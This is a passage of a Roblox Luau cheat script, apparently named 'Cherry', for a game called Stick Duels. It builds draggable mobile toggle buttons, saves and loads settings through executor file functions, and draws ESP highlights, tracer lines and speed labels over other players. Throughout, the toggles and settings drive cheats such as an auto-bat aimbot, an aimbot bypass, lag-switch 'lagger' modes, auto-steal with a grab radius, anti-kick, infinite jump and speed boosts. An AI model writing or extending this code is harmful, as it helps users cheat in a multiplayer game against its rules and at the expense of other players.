                stroke.Transparency = 0.15
                if glow then
                    glow.Color = Color3.fromRGB(255, 200, 80)
                    glow.Thickness = 5
                    glow.Transparency = 0.55
                end
            end
        end

        M.mobBtnRefs[key] = setOn

        btn.MouseButton1Down:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.05), {
                BackgroundColor3 = BTN_ON,
                TextColor3 = TXT_ON
            }):Play()
        end)
        btn.MouseButton1Up:Connect(function()
            if not isOn then
                TweenService:Create(btn, TweenInfo.new(0.1), {
                    BackgroundColor3 = BTN_OFF,
                    TextColor3 = TXT_OFF
                }):Play()
            end
        end)

        -- Drag individuale
        local dragging = false
        local dragStart = nil
        local startPos = nil
        btn.InputBegan:Connect(function(input)
            if M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = btn.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        M.saveBtnPositions()
                    end
                end)
            end
        end)
        btn.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local delta = input.Position - dragStart
                btn.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if dragging and M.uiLocked then
                dragging = false
            end
        end)

        btn.Activated:Connect(function()
            if key == "drop" then
                M.runDrop()
            elseif key == "tpDown" then
                M.runTPFloor()
            elseif key == "instaReset" then
                M.instaReset()
            elseif key == "autoLeft" then
                if M.autoBatEnabled then
                    M.stopBatAimbot()
                    if M.autoBatSetVisual then M.autoBatSetVisual(false) end
                    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
                end
                if M.autoRightEnabled then
                    M.autoRightEnabled = false
                    M.stopAutoRight()
                    if M.autoRightSetVisual then M.autoRightSetVisual(false) end
                    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                end
                M.autoLeftEnabled = not M.autoLeftEnabled
                if M.autoLeftEnabled then M.startAutoLeft() else M.stopAutoLeft() end
                setOn(M.autoLeftEnabled)
                if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
                saveCherryConfig()
            elseif key == "autoRight" then
                if M.autoBatEnabled then
                    M.stopBatAimbot()
                    if M.autoBatSetVisual then M.autoBatSetVisual(false) end
                    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
                end
                if M.autoLeftEnabled then
                    M.autoLeftEnabled = false
                    M.stopAutoLeft()
                    if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
                    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                end
                M.autoRightEnabled = not M.autoRightEnabled
                if M.autoRightEnabled then M.startAutoRight() else M.stopAutoRight() end
                setOn(M.autoRightEnabled)
                if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
                saveCherryConfig()
            elseif key == "autoBat" then
                if M.autoLeftEnabled then
                    M.autoLeftEnabled = false
                    M.stopAutoLeft()
                    if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
                    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                end
                if M.autoRightEnabled then
                    M.autoRightEnabled = false
                    M.stopAutoRight()
                    if M.autoRightSetVisual then M.autoRightSetVisual(false) end
                    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                end
                if not M.autoBatEnabled then
                    M.queueAutoBatStart()
                else
                    M.stopBatAimbot()
                end
                setOn(M.autoBatEnabled)
                if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
                saveCherryConfig()
            elseif key == "lagger" then
                M.toggleLaggerMode()
                setOn(M.laggerModeEnabled)
                if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
                if M.laggerModeBtn then
                    M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
                end
                saveCherryConfig()
            elseif key == "carrySpeed" then
                M.toggleCarryMode()
                setOn(M.carrySpeedActive)
                if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
                if M.carryModeBtn then
                    M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
                end
                saveCherryConfig()
            elseif key == "bypass" then
                M.toggleBypassAimbot()
                setOn(M.bypassAimbotEnabled)
                if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
                saveCherryConfig()
            elseif key == "tpBat" then
                M.toggleTpBat()
                setOn(M.tpBatEnabled)
                saveCherryConfig()
            elseif key == "laggerCarry" then
                M.toggleLaggerCarry()
                setOn(M.laggerCarryActive)
                saveCherryConfig()
            end
        end)
    end

    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
    if M.mobBtnRefs.tpBat then M.mobBtnRefs.tpBat(M.tpBatEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
end

-- ============================================================
-- CONFIG SAVE/LOAD
-- ============================================================
local CHERRY_CONFIG_NAME = "CherryConfig.json"
local CherryConfig = { Theme="Orange" }
local CHERRY_THEMES = {
    Purple   = { Accent=Color3.fromRGB(207,159,255), AccentDim=Color3.fromRGB(160,120,210), Bg=Color3.fromRGB(8,4,14),    Row=Color3.fromRGB(16,10,24) },
    Orange   = { Accent=Color3.fromRGB(255,140,40),  AccentDim=Color3.fromRGB(200,100,30),  Bg=Color3.fromRGB(14,8,4),    Row=Color3.fromRGB(24,14,8) },
    Red      = { Accent=Color3.fromRGB(232,52,68),   AccentDim=Color3.fromRGB(180,40,50),   Bg=Color3.fromRGB(14,4,6),    Row=Color3.fromRGB(24,10,12) },
    Green    = { Accent=Color3.fromRGB(46,200,120),  AccentDim=Color3.fromRGB(30,140,80),   Bg=Color3.fromRGB(4,12,8),    Row=Color3.fromRGB(10,22,14) },
    Blue     = { Accent=Color3.fromRGB(58,128,245),  AccentDim=Color3.fromRGB(40,90,180),   Bg=Color3.fromRGB(4,8,16),    Row=Color3.fromRGB(10,16,28) },
}
if M._savedTheme and CHERRY_THEMES[M._savedTheme] then
    CherryConfig.Theme = M._savedTheme
end
-- Forzar tema naranja STICK DUELS (sin imagenes)
CherryConfig.Theme = "Orange"
M.colorScheme = "Orange"
M._savedTheme = "Orange"
M.customBgId = 0
M.customBgOpacity = 1
M.mobBtnBgId = 0
M.BG_IMAGE_IDS = {}
M.MOB_BTN_IMAGE_IDS = {}


local function loadCherryConfig()
    if type(readfile)~="function" or type(isfile)~="function" then return end
    local ok,d = pcall(function()
        if not isfile(CHERRY_CONFIG_NAME) then return nil end
        return HS:JSONDecode(readfile(CHERRY_CONFIG_NAME))
    end)
    if ok and type(d)=="table" then
        local themeName = nil
        if type(d.Theme)=="string" and CHERRY_THEMES[d.Theme] then themeName = d.Theme end
        if type(d.colorScheme)=="string" and CHERRY_THEMES[d.colorScheme] then themeName = d.colorScheme end
        if themeName then
            CherryConfig.Theme = themeName
            M.colorScheme = themeName
            M._savedTheme = themeName
        end
        if type(d.normalSpeed)=="number" then M.NS=d.normalSpeed end
        if type(d.carrySpeed)=="number" then M.CS=d.carrySpeed end
        if type(d.laggerSpeed)=="number" then M.LAGGER_SPEED=d.laggerSpeed end
        if type(d.laggerCarrySpeed)=="number" then M.LAGGER_CARRY_SPEED=d.laggerCarrySpeed end
        if type(d.speedMethod)=="string" then
            for _,sm in ipairs(M.speedMethodList) do if sm==d.speedMethod then M.speedMethod=sm; break end end
        end
        if type(d.grabRadius)=="number" then M.Steal.StealRadius=d.grabRadius end
        if type(d.stealDuration)=="number" then M.Steal.StealDuration=d.stealDuration end
        if type(d.stealStopTime)=="number" then M.Steal.StopTime=d.stealStopTime end
        if type(d.stealMode)=="string" then
            if d.stealMode == "Semi" or d.stealMode == "Normal" or d.stealMode == "V1" or d.stealMode == "V2" or d.stealMode == "V3" then
                M.stealMode=d.stealMode
            end
        end
        if type(d.autoTPHeight)=="number" then M.autoTPHeight=d.autoTPHeight end
        if type(d.fovValue)=="number" then M.fovValue=d.fovValue end
        if type(d.uiScale)=="number" then M.uiScale=d.uiScale end
        if type(d.infJumpMode)=="string" then M.infJumpMode=d.infJumpMode end
        if type(d.mobileButtonsSize)=="number" then M.mobileButtonsSize=d.mobileButtonsSize end
        if type(d.skyTheme)=="string" then M.currentSkyTheme=d.skyTheme end
        if type(d.stealBarSize)=="number" then M.stealBarSize=d.stealBarSize end
        if type(d.stealBarScale)=="number" then M.stealBarScale=math.clamp(d.stealBarScale,0.4,1.5) end
        if d.carrySpeedActive~=nil then M.carrySpeedActive=d.carrySpeedActive end
        if d.laggerModeEnabled~=nil then M.laggerModeEnabled=d.laggerModeEnabled end
        if d.autoSwing~=nil then M.autoSwingEnabled=d.autoSwing==true end
        if d.introSoundEnabled~=nil then M.introSoundEnabled=d.introSoundEnabled==true end
        if d.introSongChoice then M.introSongChoice=d.introSongChoice end
        if d.introGUIEnabled~=nil then M.introGUIEnabled=d.introGUIEnabled==true end
        if d.ragdollGui~=nil then M.ragdollGuiEnabled=d.ragdollGui==true end
        if d.circleButtonsEnabled~=nil then M.circleButtonsEnabled=d.circleButtonsEnabled==true end
        if d.perButtonDrag~=nil then M.perButtonDragEnabled=d.perButtonDrag==true end
        if d.mobileButtonsEnabled~=nil then M.mobileButtonsEnabled=d.mobileButtonsEnabled end
        if d.medusaReset~=nil then M.medusaResetEnabled=d.medusaReset==true end
        if d.autoMoveSwing~=nil then M.autoMoveSwingEnabled=d.autoMoveSwing==true end
        if d.autoSwitchSpeed~=nil then M.autoSwitchSpeedEnabled=d.autoSwitchSpeed==true end
        if d.autoTurnOffSpeed~=nil then M.autoTurnOffSpeedEnabled=d.autoTurnOffSpeed==true end
        if d.autoSwitchLaggerSpeed~=nil then M.autoSwitchLaggerSpeedEnabled=d.autoSwitchLaggerSpeed==true end
        if type(d.customFont)=="string" then M.customFontSelected=d.customFont end
        if d.showPlayerSpeeds~=nil then M.showPlayerSpeeds=d.showPlayerSpeeds==true end
        if d.removeAcc~=nil then M.removeAccEnabled=d.removeAcc end
        if d.playerESPEnabled~=nil then M.playerESPEnabled=d.playerESPEnabled end
        if d.antiRagdoll~=nil then M.antiRagdollEnabled=d.antiRagdoll end
        if type(d.antiRagdollMode)=="string" and (d.antiRagdollMode=="Splatter" or d.antiRagdollMode=="No Splatter") then M.antiRagdollMode=d.antiRagdollMode end
        if d.autoStealEnabled~=nil then M.Steal.AutoStealEnabled=d.autoStealEnabled end
        if d.autoRadiusEnabled~=nil then M.autoRadiusEnabled=d.autoRadiusEnabled==true end

        if d.infiniteJump~=nil then M.infJumpEnabled=d.infiniteJump end
        if d.holdJumpEnabled~=nil then M.holdJumpEnabled=d.holdJumpEnabled==true end
        if d.antiBatEnabled~=nil then M.antiBatEnabled=d.antiBatEnabled==true end
        if d.hardHitEnabled~=nil then M.hardHitEnabled=d.hardHitEnabled==true end
        if type(d.hardHitRadius)=="number" then M.hardHitRadius=math.clamp(d.hardHitRadius,1,100) end
        if d.laggerPanelEnabled~=nil then M.laggerPanelEnabled=d.laggerPanelEnabled==true end
        if d.bypassPanelEnabled~=nil then M.bypassPanelEnabled=d.bypassPanelEnabled==true end
        if type(d.bypassMode)=="string" then M.bypassMode=d.bypassMode end
        if type(d.bypassKeybindName)=="string" then M.bypassKeybindName=d.bypassKeybindName end
        if type(d.bypassPCPower)=="number" then M.bypassPCPower=math.clamp(d.bypassPCPower,10000,150000) end
        if type(d.bypassMobilePower)=="number" then M.bypassMobilePower=math.clamp(d.bypassMobilePower,10000,100000) end
        if type(d.laggerIntensity)=="string" and M.LAGGER_INTENSITY and M.LAGGER_INTENSITY[d.laggerIntensity] then
            M.laggerIntensity = d.laggerIntensity
        end
        if type(d.laggerKeybinds)=="table" then
            for k,v in pairs(d.laggerKeybinds) do
                if type(v)=="string" then
                    pcall(function()
                        for _,e in ipairs(Enum.KeyCode:GetEnumItems()) do
                            if e.Name==v then M.laggerKeybinds[k]=e break end
                        end
                    end)
                end
            end
        end
        if type(d.antiBatKeybind)=="string" then
            pcall(function()
                for _,e in ipairs(Enum.KeyCode:GetEnumItems()) do
                    if e.Name==d.antiBatKeybind then M.antiBatKeybind=e break end
                end
            end)
        end
        if d.medusaCounter~=nil then M.medusaCounterEnabled=d.medusaCounter end
        if d.batCounter~=nil then M.batCounterEnabled=d.batCounter end
        if d.unwalkEnabled~=nil then M.unwalkEnabled=d.unwalkEnabled end
        if d.antiLag~=nil then M.antiLagEnabled=d.antiLag end
        if d.antiSummerBase~=nil then M.antiSummerBaseEnabled=d.antiSummerBase end
        if d.uiLocked~=nil then M.uiLocked=d.uiLocked==true end
        if d.stretchRez~=nil then M.stretchRezEnabled=d.stretchRez end
        if d.autoTPEnabled~=nil then M.autoTPEnabled=d.autoTPEnabled end
        if d.antiKick~=nil then M.antiKickEnabled=d.antiKick end
        if d.safeMode~=nil then M.safeModeEnabled=d.safeMode end
        if d.mirrorTPDown~=nil then M.mirrorTPDownEnabled=d.mirrorTPDown end
        -- STICK DUELS: ignorar imagenes guardadas
        M.customBgId = 0
        M.mobBtnBgId = 0
        if type(d.customBgOpacity)=="number" then M.customBgOpacity=math.clamp(d.customBgOpacity,0,1) end
        if d.autoBat~=nil then M.autoBatEnabled=d.autoBat end
        if d.semiHoldMin then M.Semi.holdMin=d.semiHoldMin end
        if d.semiHoldMax then M.Semi.holdMax=d.semiHoldMax end
        if d.semiEntryDelay then M.Semi.entryDelay=d.semiEntryDelay end
        if d.semiPrimeRange then M.Semi.primeRange=d.semiPrimeRange end
        if type(d.semiRadius)=="number" then M.Semi.radius=math.min(d.semiRadius, 10) end
        if d.lineESPEnabled~=nil then M.lineESPEnabled=d.lineESPEnabled end
        if d.menuOpen~=nil then M.menuOpen=d.menuOpen~=false end
        -- theme already applied above; keep M._savedTheme in sync
        if type(d.Theme)=="string" and CHERRY_THEMES[d.Theme] then M._savedTheme=d.Theme; M.colorScheme=d.Theme end
        if type(d.colorScheme)=="string" and CHERRY_THEMES[d.colorScheme] then M._savedTheme=d.colorScheme; M.colorScheme=d.colorScheme end
        if d.speedESPEnabled~=nil then M.speedESPEnabled=d.speedESPEnabled end
        if d.autoResetOnDeath~=nil then M.autoResetOnDeath=d.autoResetOnDeath end
        if type(d.animPack)=="string" then M.animPack=d.animPack end
        if d.headlessEnabled~=nil then M.headlessEnabled=d.headlessEnabled end
        if d.korbloxEnabled~=nil then M.korbloxEnabled=d.korbloxEnabled end
        if d.bypassAimbotEnabled~=nil then M.bypassAimbotEnabled=d.bypassAimbotEnabled end
        if d.tpBatEnabled~=nil then M.tpBatEnabled=d.tpBatEnabled==true end
        if d.animPackEnabled~=nil then M.animPackEnabled=d.animPackEnabled end
        local function lk(e,d2)
            if type(d2)~="table" then return end
            if d2.kb and Enum.KeyCode[d2.kb] then e.kb=Enum.KeyCode[d2.kb] else e.kb=nil end
            if d2.gp and Enum.KeyCode[d2.gp] then e.gp=Enum.KeyCode[d2.gp] else e.gp=nil end
        end
        if d.dropBrainrotKey then lk(M.KB.DropBrainrot,d.dropBrainrotKey) end
        if d.autoLeftKey then lk(M.KB.AutoLeft,d.autoLeftKey) end
        if d.autoRightKey then lk(M.KB.AutoRight,d.autoRightKey) end
        if d.autoBatKey then lk(M.KB.AutoBat,d.autoBatKey) end
        if d.laggerToggleKey then lk(M.KB.LaggerToggle,d.laggerToggleKey) end
        if d.tpFloorKey then lk(M.KB.TPFloor,d.tpFloorKey) end
        if d.instaResetKey then lk(M.KB.InstaReset,d.instaResetKey) end
        if d.guiHideKey then lk(M.KB.GuiHide,d.guiHideKey) end
        if d.speedToggleKey then lk(M.KB.SpeedToggle,d.speedToggleKey) end
        if d.bypassAimbotKey then lk(M.KB.BypassAimbot,d.bypassAimbotKey) end
        if d.tpBatKey then lk(M.KB.TpBat,d.tpBatKey) end
    end
end

local function saveCherryConfig()
    if type(writefile)~="function" then return end
    local function ks(e)
        if type(e) ~= "table" then return {kb=nil,gp=nil} end
        return {
            kb = (e.kb and e.kb.Name) or nil,
            gp = (e.gp and e.gp.Name) or nil,
        }
    end
    local cfg = {
        Theme=CherryConfig.Theme, colorScheme=M.colorScheme or CherryConfig.Theme, menuOpen=M.menuOpen~=false,
        normalSpeed=M.NS, carrySpeed=M.CS, laggerSpeed=M.LAGGER_SPEED,
        laggerCarrySpeed=M.LAGGER_CARRY_SPEED, speedMethod=M.speedMethod, grabRadius=M.Steal.StealRadius,
        stealDuration=M.Steal.StealDuration, stealStopTime=M.Steal.StopTime, stealMode=M.stealMode,
        autoTPHeight=M.autoTPHeight, fovValue=M.fovValue, uiScale=M.uiScale,
        infJumpMode=M.infJumpMode,
        mobileButtonsSize=M.mobileButtonsSize, skyTheme=M.currentSkyTheme,
        customBgId=tonumber(M.customBgId) or 0, customBgOpacity=tonumber(M.customBgOpacity) or 0.35,
        mobBtnBgId=tonumber(M.mobBtnBgId) or 0,
        stealBarSize=M.stealBarSize, stealBarScale=M.stealBarScale,
        carrySpeedActive=M.carrySpeedActive, laggerModeEnabled=M.laggerModeEnabled,
        autoSwing=M.autoSwingEnabled, introSoundEnabled=M.introSoundEnabled,
        introSongChoice=M.introSongChoice,
        introGUIEnabled=M.introGUIEnabled,
        ragdollGui=M.ragdollGuiEnabled, circleButtonsEnabled=M.circleButtonsEnabled,
        perButtonDrag=M.perButtonDragEnabled, mobileButtonsEnabled=M.mobileButtonsEnabled,
        medusaReset=M.medusaResetEnabled, autoMoveSwing=M.autoMoveSwingEnabled,
        autoSwitchSpeed=M.autoSwitchSpeedEnabled, autoTurnOffSpeed=M.autoTurnOffSpeedEnabled, autoSwitchLaggerSpeed=M.autoSwitchLaggerSpeedEnabled, customFont=M.customFontSelected, showPlayerSpeeds=M.showPlayerSpeeds,
        removeAcc=M.removeAccEnabled,
        playerESPEnabled=M.playerESPEnabled,
        autoStealEnabled=M.Steal.AutoStealEnabled,
        autoRadiusEnabled=M.autoRadiusEnabled,
        antiRagdoll=M.antiRagdollEnabled, antiRagdollMode=M.antiRagdollMode, infiniteJump=M.infJumpEnabled, holdJumpEnabled=M.holdJumpEnabled, antiBatEnabled=M.antiBatEnabled, hardHitEnabled=M.hardHitEnabled, hardHitRadius=M.hardHitRadius, laggerPanelEnabled=M.laggerPanelEnabled, bypassPanelEnabled=M.bypassPanelEnabled, bypassMode=M.bypassMode, bypassKeybindName=M.bypassKeybindName, bypassPCPower=M.bypassPCPower, bypassMobilePower=M.bypassMobilePower, laggerIntensity=M.laggerIntensity, laggerKeybinds={Medium=(M.laggerKeybinds and M.laggerKeybinds.Medium and M.laggerKeybinds.Medium.Name) or "V", High=(M.laggerKeybinds and M.laggerKeybinds.High and M.laggerKeybinds.High.Name) or "L", Ultra=(M.laggerKeybinds and M.laggerKeybinds.Ultra and M.laggerKeybinds.Ultra.Name) or "U"}, antiBatKeybind=(M.antiBatKeybind and M.antiBatKeybind.Name) or "K",
        medusaCounter=M.medusaCounterEnabled, batCounter=M.batCounterEnabled,
        unwalkEnabled=M.unwalkEnabled, antiLag=M.antiLagEnabled, antiSummerBase=M.antiSummerBaseEnabled, uiLocked=M.uiLocked,
        stretchRez=M.stretchRezEnabled, autoTPEnabled=M.autoTPEnabled,
        antiKick=M.antiKickEnabled, safeMode=M.safeModeEnabled, mirrorTPDown=M.mirrorTPDownEnabled, autoBat=M.autoBatEnabled,
        semiHoldMin=M.Semi.holdMin, semiHoldMax=M.Semi.holdMax,
        semiEntryDelay=M.Semi.entryDelay,
        semiPrimeRange=M.Semi.primeRange,
        semiRadius=math.min(M.Semi.radius, 10),
        lineESPEnabled=M.lineESPEnabled,
        speedESPEnabled=M.speedESPEnabled,
        autoResetOnDeath=M.autoResetOnDeath,
        animPack=M.animPack,
        headlessEnabled=M.headlessEnabled,
        korbloxEnabled=M.korbloxEnabled,
        bypassAimbotEnabled=M.bypassAimbotEnabled, tpBatEnabled=M.tpBatEnabled,
        animPackEnabled=M.animPackEnabled,
        dropBrainrotKey=ks(M.KB.DropBrainrot), autoLeftKey=ks(M.KB.AutoLeft),
        autoRightKey=ks(M.KB.AutoRight), autoBatKey=ks(M.KB.AutoBat),
        laggerToggleKey=ks(M.KB.LaggerToggle), tpFloorKey=ks(M.KB.TPFloor),
        instaResetKey=ks(M.KB.InstaReset), guiHideKey=ks(M.KB.GuiHide),
        speedToggleKey=ks(M.KB.SpeedToggle), bypassAimbotKey=ks(M.KB.BypassAimbot), tpBatKey=ks(M.KB.TpBat),
    }
    pcall(function() writefile(CHERRY_CONFIG_NAME, HS:JSONEncode(cfg)) end)
end

M.saveConfig = saveCherryConfig

-- ============================================================
-- CHERRY ESP
-- ============================================================
local RunService2 = game:GetService("RunService")
local cherryESPState = { LineESP=false, SpeedESP=false }
local cherryESPObjects = {}
local DrawingAvailable = false
pcall(function() DrawingAvailable = Drawing and type(Drawing.new)=="function" end)

local function cherryRemoveESP(p)
    local r = cherryESPObjects[p]
    if not r then return end
    for _,o in pairs(r) do pcall(function()
        if typeof(o)=="Instance" then o:Destroy()
        elseif o.Remove then o:Remove() end
    end) end
    cherryESPObjects[p]=nil
end

local function cherryGetSpeed(root)
    local v
    pcall(function() v=root.AssemblyLinearVelocity end)
    if not v then pcall(function() v=root.Velocity end) end
    if not v then return 0 end
    return Vector3.new(v.X,0,v.Z).Magnitude
end

local function cherryCreateESP(p)
    if cherryESPObjects[p] then return cherryESPObjects[p] end
    local r={}
    local hl=Instance.new("Highlight")
    hl.FillTransparency=1; hl.OutlineTransparency=0
    hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop
    hl.Enabled=false; hl.Parent=workspace
    r.Highlight=hl
    local bb=Instance.new("BillboardGui")
    bb.Size=UDim2.fromOffset(150,32); bb.StudsOffset=Vector3.new(0,3.25,0)
    bb.AlwaysOnTop=true; bb.Enabled=false; bb.ResetOnSpawn=false
    bb.Parent=player:WaitForChild("PlayerGui")
    local sl=Instance.new("TextLabel",bb)
    sl.Size=UDim2.fromScale(1,1); sl.BackgroundTransparency=1; sl.Text="0.0 spd"
    sl.TextStrokeColor3=Color3.new(0,0,0); sl.TextStrokeTransparency=0
    sl.Font=Enum.Font.GothamBlack; sl.TextSize=18
    sl.TextXAlignment=Enum.TextXAlignment.Center; sl.TextYAlignment=Enum.TextYAlignment.Center
    r.Billboard=bb; r.SpeedText=sl
    if DrawingAvailable then
        local ln=Drawing.new("Line")
        ln.Visible=false; ln.Thickness=2.75; ln.Transparency=1
        r.Line=ln
    end
    cherryESPObjects[p]=r
    return r
end

Players.PlayerRemoving:Connect(function(p) cherryRemoveESP(p) end)

-- Build dark UI colours from a chosen accent (every "black" becomes that colour family)
local function themeDarkFromAccent(accent, amount)
    -- amount 0 = pure black, 1 = full accent
    amount = math.clamp(tonumber(amount) or 0.12, 0, 1)
    return Color3.new(
        math.clamp(accent.R * amount, 0, 1),
        math.clamp(accent.G * amount, 0, 1),
        math.clamp(accent.B * amount, 0, 1)
    )
end

local function isNearBlack(c, threshold)
    if typeof(c) ~= "Color3" then return false end
    threshold = threshold or 0.14
    return c.R <= threshold and c.G <= threshold and c.B <= threshold
end

local function applyAccentFromTheme()
    local name = CherryConfig.Theme or M.colorScheme or M._savedTheme or "Orange"
    if not CHERRY_THEMES[name] then name = "Orange" end
    CherryConfig.Theme = name
    M.colorScheme = name
    M._savedTheme = name
    local t = CHERRY_THEMES[name]
    local accent = t.Accent
    local dim = t.AccentDim or accent:Lerp(Color3.new(0,0,0), 0.35)

    -- EVERY black UI slot is derived from the chosen accent colour
    local bg  = themeDarkFromAccent(accent, 0.10)   -- main background
    local row = themeDarkFromAccent(accent, 0.18)   -- rows / cards
    local btn = themeDarkFromAccent(accent, 0.22)   -- buttons
    local tog = themeDarkFromAccent(accent, 0.28)   -- toggle off track
    local gradTop = themeDarkFromAccent(accent, 0.26)
    local gradBot = themeDarkFromAccent(accent, 0.08)

    CHERRY_ACCENT = accent
    UI_ACCENT = accent
    UI_ACCENT_DIM = dim
    UI_BG_DARK = bg
    UI_ROW_BG = row
    UI_BTN_BG = btn
    UI_TOGGLE_OFF = tog
    UI_TOGGLE_KNOB = Color3.fromRGB(200, 200, 210)
    UI_KNOB_ON = Color3.fromRGB(255, 255, 255)
    UI_TEXT_PRIMARY = Color3.fromRGB(255, 255, 255)
    UI_TEXT_WHITE = Color3.fromRGB(255, 255, 255)
    UI_TEXT_DIM = dim:Lerp(Color3.fromRGB(200,200,210), 0.4)
    UI_TEXT_SECTION = accent
    UI_CARD_STROKE = dim
    UI_GRAD_TOP = gradTop
    UI_GRAD_BOT = gradBot

    M.Theme = {
        Name = name,
        Accent = accent,
        AccentDim = dim,
        Bg = bg,
        Row = row,
    }
end

-- Walk any GUI tree and replace near-black BackgroundColor3 / stroke blacks with theme colours
function M.recolorBlacksToTheme(root)
    if not root then return end
    local bg = UI_BG_DARK or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.10)
    local row = UI_ROW_BG or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.18)
    local btn = UI_BTN_BG or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.22)
    local accent = UI_ACCENT or Color3.new(1,1,1)
    local dim = UI_ACCENT_DIM or accent

    local function recolor(obj)
        if obj:IsA("GuiObject") then
            local ok, col = pcall(function() return obj.BackgroundColor3 end)
            if ok and isNearBlack(col) then
                -- Main frames stay darkest; smaller elements get row/btn tint
                if obj:IsA("Frame") and (obj.Name == "Main" or obj.Name == "MainFrame" or obj.Size.X.Scale >= 0.9) then
                    obj.BackgroundColor3 = bg
                elseif obj:IsA("TextButton") or obj:IsA("ImageButton") then
                    obj.BackgroundColor3 = btn
                else
                    obj.BackgroundColor3 = row
                end
            end
        end
        if obj:IsA("UIStroke") then
            local ok, col = pcall(function() return obj.Color end)
            if ok and isNearBlack(col, 0.25) then
                obj.Color = dim
            end
        end
        if obj:IsA("UIGradient") then
            pcall(function()
                obj.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, UI_GRAD_TOP or gradTop or row),
                    ColorSequenceKeypoint.new(1, UI_GRAD_BOT or bg),
                })
            end)
        end
    end

    recolor(root)
    for _, d in ipairs(root:GetDescendants()) do
        recolor(d)
    end
end

local CHERRY_ACCENT = CHERRY_THEMES[CherryConfig.Theme].Accent

RunService2.RenderStepped:Connect(function()
    local cam=workspace.CurrentCamera; if not cam then return end
    local lc=player.Character
    local lr=lc and lc:FindFirstChild("HumanoidRootPart")
    local lineStart=Vector2.new(cam.ViewportSize.X*0.5, cam.ViewportSize.Y*0.82)
    if lr then
        local rp,rv=cam:WorldToViewportPoint(lr.Position)
        if rv and rp.Z>0 then lineStart=Vector2.new(rp.X,rp.Y) end
    end
    for _,p in ipairs(Players:GetPlayers()) do
        if p==player then continue end
        local r=cherryCreateESP(p)
        local ch=p.Character
        local hum=ch and ch:FindFirstChildOfClass("Humanoid")
        local root=ch and ch:FindFirstChild("HumanoidRootPart")
        local head=ch and ch:FindFirstChild("Head")
        local alive=ch and hum and root and hum.Health>0
        if not alive then
            if r.Line then r.Line.Visible=false end
            r.Highlight.Enabled=false; r.Billboard.Enabled=false
            r.Highlight.Adornee=nil; r.Billboard.Adornee=nil
            continue
        end
        local liveAccent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255,255,255)
        r.Highlight.Adornee=ch; r.Highlight.Enabled=cherryESPState.LineESP
        r.Highlight.OutlineColor=liveAccent
        r.Highlight.FillColor=liveAccent
        r.Highlight.FillTransparency=0.85
        if r.Line then
            local tp,tv=cam:WorldToViewportPoint(root.Position)
            if cherryESPState.LineESP and tv and tp.Z>0 then
                r.Line.From=lineStart; r.Line.To=Vector2.new(tp.X,tp.Y)
                r.Line.Color=liveAccent; r.Line.Thickness=2.75; r.Line.Visible=true
            else r.Line.Visible=false end
        end
        if cherryESPState.SpeedESP and head then
            r.Billboard.Adornee=head; r.Billboard.Enabled=true
            r.SpeedText.Text=string.format("%.1f spd",cherryGetSpeed(root))
            r.SpeedText.TextColor3=liveAccent
        else r.Billboard.Enabled=false; r.Billboard.Adornee=nil end
    end
end)

function M.trackConn(conn) table.insert(M._persistentConns,conn); return conn end
function M.clearPersistentConns()
    for _,c in ipairs(M._persistentConns) do pcall(function() c:Disconnect() end) end
    M._persistentConns={}
end

function M.makeNumberCallback(tbl,key,min,max)
    return function(v)
        if min and v<min then return end
        if max and v>max then return end
        tbl[key]=v
        if key=="mobileButtonsSize" and M.mobileButtonsEnabled then M.buildMobileButtons() end
        if key=="stealBarSize" then M.buildStatusUI() end
        saveCherryConfig()
    end
end

-- ============================================================
-- ASKER DUELS UI (ORIZZONTALE TABS + MENU PIÙ BASSO)
-- ============================================================

local UI_ACCENT       = Color3.fromRGB(255, 255, 255)
local UI_ACCENT_DIM   = Color3.fromRGB(180, 180, 190)
local UI_BG_DARK      = Color3.fromRGB(0,0,0)
local UI_ROW_BG       = Color3.fromRGB(0,0,0)
local UI_CARD_STROKE  = Color3.fromRGB(128, 128, 128)
